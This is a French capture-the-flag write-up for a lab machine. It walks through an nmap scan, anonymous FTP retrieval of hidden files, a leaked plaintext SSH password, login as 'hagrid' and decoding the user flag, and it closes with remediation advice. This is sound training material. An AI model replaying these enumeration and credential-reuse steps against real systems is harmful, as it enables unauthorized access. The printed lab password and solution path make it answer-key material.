---
author: Paul
date: 2026-10-06
version: 1.0.0
modification: Harmonisation du write-up
cve: Aucun CVE produit applicable ; CWE-552 et CWE-522
---

# Yer a Wizard — Récupération du flag utilisateur

## 1. Reconnaissance

On commence par identifier les services exposés :

```bash
nmap -sC -sV -p- 10.10.0.32
```

Résultat utile :

```text
21/tcp open ftp
22/tcp open ssh
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

Le FTP anonyme permet de récupérer les fichiers présents sur la cible.

## 2. Énumération FTP

```bash
ftp 10.10.0.32
ftp> ls -la
ftp> get .hidden
ftp> cd ...
ftp> ls -la
ftp> get .reallyHidden
```

Le fichier `.hidden` donne l'utilisateur `hagrid`, mais son mot de passe ne fonctionne pas. Le fichier `.reallyHidden` contient le mot de passe SSH :

```text
IAlreadySaidTooMuch
```

## 3. Connexion SSH et récupération du flag

```bash
ssh hagrid@10.10.0.32
cat user.txt
```

Le contenu de `user.txt` est encodé en Base64. On le décode trois fois pour obtenir le flag final.

## 4. Remédiation

### FTP anonyme et fichiers sensibles

- Désactiver l'accès anonyme FTP s'il n'est pas indispensable.
- Ne pas exposer de fichiers cachés, de secrets ou d'identifiants dans un répertoire public.
- Préférer SFTP ou FTPS, limiter les comptes à leur répertoire et journaliser les téléchargements.

### Identifiants en clair

- Ne jamais stocker un mot de passe SSH dans un fichier accessible par FTP.
- Utiliser des clés SSH protégées par une passphrase et stockées avec des permissions `600`.
- Révoquer et remplacer immédiatement tout secret exposé.

## 5. Reproductibilité

Les commandes, les fichiers récupérés, les identifiants découverts et le résultat attendu sont visibles dans les étapes précédentes. Un tiers peut refaire le parcours sur la même cible en remplaçant uniquement l'adresse IP si nécessaire.